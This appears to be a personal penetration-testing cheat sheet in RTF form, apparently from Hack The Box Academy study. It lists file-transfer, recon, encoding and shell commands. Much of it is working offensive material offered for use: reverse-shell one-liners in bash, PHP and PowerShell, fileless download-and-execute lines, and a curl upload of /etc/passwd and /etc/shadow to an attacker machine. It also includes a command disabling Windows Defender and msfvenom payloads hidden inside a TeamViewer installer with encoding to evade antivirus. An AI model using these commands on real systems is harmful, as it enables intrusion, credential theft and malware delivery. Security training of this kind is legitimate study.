\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb12 \'a7 \cb1 sudo ncat -l -p 443 --send-only < $file						:Ncat where attack box listening on 443 and redirects input from the file to ncat command \
\cb12 \'a7 \cb1 ncat $ip 443 --recv-only > $file							:Ncat where compromised box connects to attack and downloads file\
\
PS C:> $Session = New-PSSession -ComputerName DB1                                                                                    (creates session with remote host, needs admin privs)\
PS C:> Copy-Item -Path C:\\file.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\                   (Copy file.txt from Localhost to the DB1 Session)\
PS C:> Copy-Item -Path "C:\\Users\\Administrator\\Desktop\\db.txt" -Destination C:\\ -FromSession $Session            (Copy db.txt from DB1 Session to our Localhost)\
\
\'a7 rdesktop $ip -d $domain -u $username -p \'91$pass\'92 -r disk:linux='/home/user/rdesktop/files'                                     (Mounting a Linux Folder Using rdesktop)\
\'a7 xfreerdp /v:$ip /d:$domain /u:$usernmae /p:'$pass' /drive:linux,/home/plaintext/htb/academy/filetransfer              (Mounting a Linux Folder Using xfreerdp)\
\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb13 \'a7 \cb1 python3 -m pip install --user uploadserver\
\cb13 \'a7 \cb1 openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'                 (generates a self-signed SSL/TLS certificate)\
\cb13 \'a7 \cb1 python3 -m uploadserver 443 --server-certificate $fullpathtocertificate.pem                                                                       (starts webserver using HTTPS)\
\cb13 \'a7 \cb1 curl -X POST https://$ip/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure                                              (upload the /etc/passwd and /etc/shadow files to attack machine)\
\
\cb14 \'a7 \cb1 pip3 install uploadserver								:installing a Configured WebServer with Upload functionality\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb15 \'a7 \cb1 python3 -m uploadserver								:starting WebServer with Upload functionality\
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb16 \'a7 \cb1 python3 -c 'import requests;requests.post("http://$ip:8000/upload",files=\{"files":open("/etc/passwd","rb")\})'                     (uploads /etc/passwd file to attack machine using python3)\
\
\'a7 python3 -m http.server								:creating a Web Server with Python3\
\'a7 python2.7 -m SimpleHTTPServer						:creating a Web Server with Python2.7\
\'a7 php -S 0.0.0.0:8000									:creating a Web Server with PHP\
\'a7 ruby -run -ehttpd . -p8000								:creating a Web Server with Ruby\
\'a7 python3 -c "import urllib.request; urllib.request.urlretrieve('https://example.com/file.txt', '/path/to/save/file.txt')"                  (download a file using python3 from the internet)\
\'a7 php -r '$file = file_get_contents("$URL"); file_put_contents("LinEnum.sh",$file);'                                                                  (download a file using php from the internet)\
\'a7 php -r 'const BUFFER = 1024; $fremote = fopen("$URL", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) \{ fwrite($flocal, $buffer); \} fclose($flocal); fclose($fremote);'\
\'a7 php -r '$lines = @file("$URL"); foreach ($lines as $line_num => $line) \{ echo $line; \}' | bash                                             (PHP Download a File and Pipe it to Bash(fileless))\
\'a7 ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("$URL")))'                                                   (download a file using ruby from the internet)\
\'a7 perl -e 'use LWP::Simple; getstore("$URL", "LinEnum.sh");'                                                                                              (download a file using perl from the internet)\
C:> bitsadmin /transfer n $URL C:\\Temp\\nc.exe                                                                                                             (Download a file using Bitsadmin in cmd prompt)\
PS C:> Import-Module bitstransfer; Start-BitsTransfer -Source "http://$ip/$file\'94 -Destination "C:\\Temp\\$destfile"          (Download a file using Bitsadmin in Powershell)\
C:> certutil.exe -verifyctl -split -f $URL                                                                                                                             (Download a file using Certutil in cmd prompt)\
C:> certreq.exe -Post -config http://$ip/ c:\\windows\\file.txt                                                                                          (upload file from Windows, make sure nc is listening on port 80)\
PS C:> GfxDownloadWrapper.exe "http://$ip/mimikatz.exe" "C:\\Temp\\nc.exe"                                                        (download file from powershell)\
PS C:> Invoke-WebRequest http://$ip/$file -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\\Users\\Public\\$file"        (download File using a Chrome User Agent)\
\
\
		Download file to Linux with \cb17 OpenSSL\cb1 \
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0
\cf0 \cb17 \'a7 \cb1 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem                                  (create Certificate in attack box)\
\cb17 \'a7 \cb1 openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh                                       (run server in attack box)\
\cb17 \'a7 \cb1 openssl s_client -connect $ip:80 -quiet > LinEnum.sh                                                                                             (download File in Compromised Machine)\
\
		run SMB over HTTP with \cb18 WebDav\cb1 \
\cb18 \'a7 \cb1 sudo pip install wsgidav cheroot							:installing WebDav Python modules\
\cb18 \'a7 \cb1 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous                (Using the WebDav Python module)\
    \cb18 C:>\cb1  dir \\\\$ip\\DavWWWRoot   or   dir \\\\$ip\\$share				:connecting to the Webdav Share from target\
    \cb18 C:>\cb1  copy C:$\\Path to file \\\\$ip\\DavWWWRoot\\   or \\$share\\		:uploading Files using SMB over HTTP\
\
		Download with \cb19 Bash\cb1  (/dev/tcp)\
\cb19 \'a7 \cb1 exec 3<>/dev/tcp/$ip/80								:connect to the Target Web server\
\cb19 \'a7 \cb1 echo -e "GET /LinEnum.sh HTTP/1.1\\n\\n">&3				:HTTP GET Request\
\cb19 \'a7 \cb1 cat <&3											:print the Response\
\
		\cb20 SSH\cb1  Downloads\
\cb20 \'a7 \cb1 sudo systemctl enable ssh								:enables SSH server on attack machine\
\cb20 \'a7 \cb1 sudo systemctl start ssh								:starts SSH server on attack machine\
\cb20 \'a7 \cb1 netstat -lnpt										:display network-related information about active listening ports (check if SSH server is listening)\
\
               \cb21 Javascript\cb1  Download file from web\
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1"); // name the file wget.js\
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false); // execute this file either on windows command prompt or powershell\
WinHttpReq.Send();\
BinStream = new ActiveXObject("ADODB.Stream");\
BinStream.Type = 1;\
BinStream.Open();\
BinStream.Write(WinHttpReq.ResponseBody);\
BinStream.SaveToFile(WScript.Arguments(1));\
\
\cb21 C:>\cb1  cscript.exe /nologo wget.js $URL $savefile\
\
                 \cb15 VBScript\cb1  Download file on Windows\
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")\
dim bStrm: Set bStrm = createobject("Adodb.Stream")\
xHttp.Open "GET", WScript.Arguments.Item(0), False\
xHttp.Send\
\
with bStrm\
    .type = 1\
    .open\
    .write xHttp.responseBody\
    .savetofile WScript.Arguments.Item(1), 2\
end with\
\
\cb15 C:>\cb1  cscript.exe /nologo wget.vbs $URL $savedfile\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Encoding
\f1\b0 :\
\'a7 base64 $file -w 0 > $outfile								:encode a file using base64\
\'a7 base64 $file > $oufile								:decode a base64 file\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Bash
\f1\b0 :\
\'a7 for i in $(cat $subdomainlist);do host $i | grep "has address" | grep $domain | cut -d" " -f1,4;done              (outputs all responsive subdomains)\
\'a7 for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\\n' $i)" | grep "User Name\\|user_rid\\|group_rid" && echo "";done      (brute force RPC RID\'92s)\
\'a7 for sub in $(cat $wordlistfile);do dig $sub.inlanefreight.htb @$ip | grep -v ';\\|SOA' | sed -r '/^\\s*$/d' | grep $sub | tee -a $outfile;done       (brute force subdomains)\
\'a7 names=($(cat names.txt)); total_names=$\{#names[@]\}; batch_size=10; for ((i = 0; i < $total_names; i += batch_size)); do start_index=$i; end_index=$((i + batch_size - 1)); if ((end_index >= total_names)); then end_index=$((total_names - 1)); fi; ( sleep 10; echo "EHLO user"; sleep 1; for ((j = start_index; j <= end_index; j++)); do echo "VRFY $\{names[j]\}"; sleep 1; done; echo "quit" ) | telnet $ip 25; done                     (enumerate SMTP users 10 names at a time)\
\'a7 cat ./$file | while read vhost;do echo "\\n********\\nFUZZING: $\{vhost\}\\n********";curl -s -I http://$ip -H "HOST: $\{vhost\}.$\'94domain | grep "Content-Length: ";done       (vHost subdomain fuzzing)\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Shodan
\f1\b0 :\
\'a7 shodan host $ip									:shodan one ip\
\'a7 for i in $(cat ip-addresses.txt);do shodan host $i;done			:shodan multiple IP\'92s in a file with a list of IP\'92s\
\'a7 shodan init $api-key\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b DNS
\f1\b0 :\
\'a7 dnsenum --dnsserver $nameserverip --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt $domain     (subdomain brute forcing)\
\'a7 dig axfr $domain @$ip								:attempt zone transfer from name server \
\'a7 dig any $domain @$nameserverip						:ANY request to the specific name server\
\'a7 gobuster dns -q -r "$\{NS\}" -d "$\{TARGET\}" -w "$\{WORDLIST\}" -p ./patterns.txt -o "gobuster_$\{TARGET\}.txt"\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b The Harvester
\f1\b0 :\
\'a7 cat tools.txt | while read source; do theHarvester -d \'93$domain\'94 -b $source -f "$\{source\}_$domain\'94;done\
\'a7 cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > \'93$domain_theHarvester.txt"                    (puts all subdomains in txt file)\
\'a7 \
	baidu\
	bufferoverun\
	crtsh\
	hackertarget\
	otx\
	projecdiscovery\
	rapiddns\
	sublist3r\
	threatcrowd\
	trello\
	urlscan\
	vhost\
	virustotal\
	zoomeye\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b MacOS
\f1\b0 :\
\'a7 sysctl -n machdep.cpu.brand_string						:output the brand of your CPU, includes name and model of processor\
\'a7 md5 -q $file										:outputs MD5 hash of file\
\'a7 cat $file | base64 ;echo								:encodes file to base64\
\'a7 \
\'a7 \
\'a7 \
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Powershell
\f1\b0 :\
\'a7 Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber                                (check windows operating system version)\
\'a7 [Convert]::ToBase64String((Get-Content -path "C:\\Pathtofile" -Encoding byte))                              (encode string to base 64)\
\'a7 [IO.File]::WriteAllBytes(\'93C:\\Pathtofile\'94, [Convert]::FromBase64String(\'93base64string\'94))                   (decode base64 string and output into file)\
\'a7 Get-FileHash \'93C:\\$Pathtofile" -Algorithm MD5 | select Hash		:get md5 hash of file\
\'a7 Get-FileHash C:\\$Pathtofile -Algorithm md5					:get md5 hash of file\
\'a7 (New-Object Net.WebClient).DownloadFile(\'91$URL\'92,\'92$outputfilepath\'92)                                              (download file from internet and put into file, waits for complete download before cont other code)\
\'a7 (New-Object Net.WebClient).DownloadFileAsync(\'91$URL\'92,\'92$outputfilepath\'92)                                     (same as above except allows for other code to run while download takes place in background)\
\'a7 IEX (New-Object Net.WebClient).DownloadString(\'91$URL\'92)		                                              (downloads file but runs it in memory (fileless))\
\'a7 (New-Object Net.WebClient).DownloadString(\'91$URL\'92) | IEX                                                             (same as above)\
\'a7 Invoke-WebRequest $URL -OutFile $file					:downloads file from internet\
\'a7 Invoke-WebRequest $URL -UseBasicParsing | IEX			:use if error occurs when downloading with above command\
\'a7 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = \{$true\}             (run if error with regards to untrusted TLS certificates)\
\'a7 (New-Object Net.WebClient).DownloadFile('ftp://$ip/file.txt', 'ftp-file.txt')            (transferring Files from an FTP Server Using PowerShell)\
\
\'a7 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@\{label="User Agent";Expression=\{[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)\}\} | fl\
								(lists UserAgents)\
\'a7 Invoke-WebRequest http://$ip/$file -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\\Users\\Public\\$file"        (download File using a Chrome User Agent)\
\
\cb22 \'a7 \cb1 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')            (downloads script to uploads files to uploadserver)\
\cb22 \'a7 \cb1 Invoke-FileUpload -Uri http://$ip:8000/upload -File C:\\$Pathtofile	:uploads file to uploadserver on attack machine\
\
\cb23 \'a7 \cb1 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\$Pathtofile' -Encoding Byte))                                        (PowerShell Script to Upload a File to Python Upload Server(uploadserver))\
\cb23 \'a7 \cb1 Invoke-WebRequest -Uri http://$ip:8000/ -Method POST -Body $b64                                                                        (catch base64 with netcat using \'91nc -lvnp 8000\'92)\
\
PS C:> $Session = New-PSSession -ComputerName DB1                                                                                    (creates session with remote host, needs admin privs)\
PS C:> Copy-Item -Path C:\\file.txt -ToSession $Session -Destination C:\\Users\\Administrator\\Desktop\\                   (Copy file.txt from Localhost to the DB1 Session)\
PS C:> Copy-Item -Path "C:\\Users\\Administrator\\Desktop\\db.txt" -Destination C:\\ -FromSession $Session            (Copy db.txt from DB1 Session to our Localhost)\
PS :C> net localgroup									:checking Local Group Membership of current user\
PS :C> net user $username								:checking User Account Privileges including Domain\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b CMD Prompt
\f1\b0 :\
C:> tree c:\\ /f | more									:walk through all the files in the C drive, one screen at a time\
C:> dir c:\\ /a										:list contents of directory\
C:> icacls $directory									:list out the NTFS permissions on a specific directory\
C:> icacls c:\\users /grant joe:f							:grant user joe full acces to \\users directory (icacls c:\\users /remove joe (to revoke))\
C:> \
C:> \
C:> \
C:> \
C:> \
C:> \
\
\cb12 \{\cb1 	C:\\htb> echo open 192.168.49.128 > ftpcommand.txt                               (Create a Command File for the FTP Client and Download the Target File)\
	C:\\htb> echo USER anonymous >> ftpcommand.txt\
	C:\\htb> echo binary >> ftpcommand.txt\
	C:\\htb> echo GET file.txt >> ftpcommand.txt\
	C:\\htb> echo bye >> ftpcommand.txt\
	C:\\htb> ftp -v -n -s:ftpcommand.txt\
	ftp> open 192.168.49.128\
	Log in with USER and PASS first.\
	ftp> USER anonymous\
\
	ftp> GET file.txt\
	ftp> bye\
\
	C:\\htb>more file.txt\
	This is a test file                          \cb24 \}\cb1 \
\
\cb25 \{\cb1 	C:\\htb> echo open 192.168.49.128 > ftpcommand.txt                               (Create a Command File for the FTP Client to Upload a File)\
	C:\\htb> echo USER anonymous >> ftpcommand.txt\
	C:\\htb> echo binary >> ftpcommand.txt\
	C:\\htb> echo PUT c:\\windows\\system32\\drivers\\etc\\hosts >> ftpcommand.txt\
	C:\\htb> echo bye >> ftpcommand.txt\
	C:\\htb> ftp -v -n -s:ftpcommand.txt\
	ftp> open 192.168.49.128\
\
	Log in with USER and PASS first.\
\
	ftp> USER anonymous\
	ftp> PUT c:\\windows\\system32\\drivers\\etc\\hosts\
	ftp> bye				     \cb26 \}\cb1 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Encrypt File in Windows with Powershell
\f1\b0 :\
download script powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1\
PS C:\\> Import-Module .\\Invoke-AESEncryption.ps1				                                                    :imports script as module so it can be used as cmdlet\
PS C:\\> Invoke-AESEncryption.ps1 -Mode Encrypt -Key "p4ssw0rd" -Path .\\scan-results.txt                  :encrypts a file\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Encrypt File in Linux
\f1\b0 :\
\'a7 openssl enc -aes256 -iter 100000 -pbkdf2 -in $infile -out $outfile                                     :encrypt and specify password to generate encryption key\
\'a7 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in $infile -out $outfile                                 :decrypt \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b NGINX to Upload files over HTTP
\f1\b0 :\
\'a7 sudo mkdir -p /var/www/uploads/SecretUploadDirectory			                               :create a directory to handle uploaded files\
\'a7 sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory              :change the Owner to www-data\
\'a7 sudo nano /etc/nginx/sites-available/upload.conf                                                              :create Nginx donfiguration file\
server \{\
    listen 9001;\
    \
    location /SecretUploadDirectory/ \{\
        root    /var/www/uploads;\
        dav_methods PUT;\
    \}\
\}\
\
\'a7 sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/                       :symlink our Site to the sites-enabled directory\
\'a7 sudo systemctl restart nginx.service                    :start nginx\
                                                                               \
IF ERRORS\
   \'a7 tail -2 `/var/log/nginx/error.log`				:check logs\
   \'a7 ss -lnpt | grep `80`						:port 80 might already be in use with pid 2811 lets say\
   \'a7 ps -ef | grep `2811`						:check pid details\
   \'a7 sudo rm /etc/nginx/sites-enabled/default		:remove the default Nginx configuration, which binds on port 80\
\
\'a7 curl -T $filepath http://localhost:9001/SecretUploadDirectory/users.txt                           :uploads file using curl\
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Shells
\f1\b0 :\
revshells.com                   (reverse shell generator)\
https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"); ?>                 (php reverse shell)\
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f' | tee -a $file                      (append reverse shell to executable script you can run with sudo)\
\
Making Shells interactive:\
\cb27 \'a7 \cb1 nc $ip $port										:connect to service\
\cb27 \'a7 \cb1 which python										:checks if there is python\
\cb27 \'a7 \cb1 python -c 'import pty; pty.spawn("/bin/sh")'\
\cb27 \'a7 \cb1 python3 -c 'import pty; pty.spawn("/bin/bash")'				:upgrade to interactive shell\
	^z\
	\cb27 \'a7 \cb1 stty raw -echo\
	\cb27 \'a7 \cb1 fg						:gets back to the shell\
	\cb27 \'a7 \cb1 echo $TERM\
	\cb27 \'a7 \cb1 stty size\
	\'a9 export TERM=xterm-256color\
	\'a9 stty rows 26 columns 126\
\'a7 /bin/sh -i\
\'a7 perl \'97e 'exec "/bin/sh";'\
\'a7 perl: exec "/bin/sh";									:should be run from a script\
\'a7 ruby: exec "/bin/sh"									:should be run from a script\
\'a7 lua: os.execute('/bin/sh')								:should be run from a script\
\'a7 awk 'BEGIN \{system("/bin/sh")\}'\
\'a7 find / -name nameoffile -exec /bin/awk 'BEGIN \{system("/bin/sh")\}' \\;\
\'a7 find . -exec /bin/sh \\; -quit\
\'a7 vim -c ':!/bin/sh'\
\'a7 \
\'a7 \
\'a7 \
\
\'a7 ps												:verify which shell with Bash or Powershell\
\'a7 env | grep "SHELL="									:verify which shell with Bash\
\'a7 Get-ChildItem Env: | Where-Object \{ $_.Name -eq "SHELL" \}		:verify which shell with Powershell\
	\
	Bind Shell:\
     \'a7 nc -lvnp $port			:on target            (not a shell!)\
     \'a7 nc -nv $ip $port			:on attack box	(not a shell!)\
\'a7 rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $ip $port > /tmp/f                 (on target)\
\'a7 nc -nv $ip $port								                                           (on attack box)\
	Reverse Shell:\
revshells.com                (reverse shell generator)\
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md\
\'a7 sudo nc -lvnp 443			:listen on attack box\
C:> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$Ip',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()\};$client.Close()"                          (windows connect to attack box(AV blocks))\
PS C:> Set-MpPreference -DisableRealtimeMonitoring $true                   (disables AV)\
\'a7 \
\
Webshells:\
Laudanum files in the /usr/share/webshells/laudanum directory\
\'a7 cp /usr/share/webshells/laudanum/aspx/shell.aspx /home/tester/demo.aspx                   (move a copy for modification)\
\
Antak files can be found in the /usr/share/nishang/Antak-WebShell\
\'a7 cp /usr/share/nishang/Antak-WebShell/antak.aspx .                                          (set credentials for access to the web shell, adding a user and password)\
PHP reverse shell example: github.com/WhiteWinterWolf/wwwolf-php-webshell\
 - if upload page only allows gif file, we can use burp to change Content-type from application/x-php to image/gif\
\'a7 \
\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\'97\

\f0\b Msfvenom
\f1\b0 :\
\'a7 msfvenom -l payloads							:lists available payloads\
\'a7 msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f elf > file.elf                           (example stageless payload creation for linux)\
\'a7 sudo nc -lvnp $port								:catch the shell\
\
\'a7 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe > file.exe                         (example stageless payload creation for Windows (probably detected by AV))\
\'a7 sudo nc -lvnp $port								:catch the shell\
\
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f aspx > reverse_shell.aspx       (staged payload creation for windows aspx )\
\
\'a7 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -b "\\x00" -f perl               (Generating Payload - Without Encoding)\
\'a7 msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -b "\\x00" -f perl -e x86/shikata_ga_nai                (Generating Payload - With Encoding)\
\'a7 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -o ./file.exe. (Shikata ga nai encoding)\
\'a7 msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -e x86/shikata_ga_nai -f exe -i 10 -o ./file.exe      (encoding multiple times)\
\'a7 msfvenom windows/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5                                  (embed payloads into an executable file)\
\'a7 msfvenom windows/x86/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5        (place password on file to bypass antivirus signatures)\
\
Other Payload Generators:\
- github.com/swisskyrepo/PayloadsAllTheThings\
- github.com/bats3c/darkarmour\
- github.com/samratashok/nishang                   (For Powershell)\
- github.com/its-a-feature/Mythic\
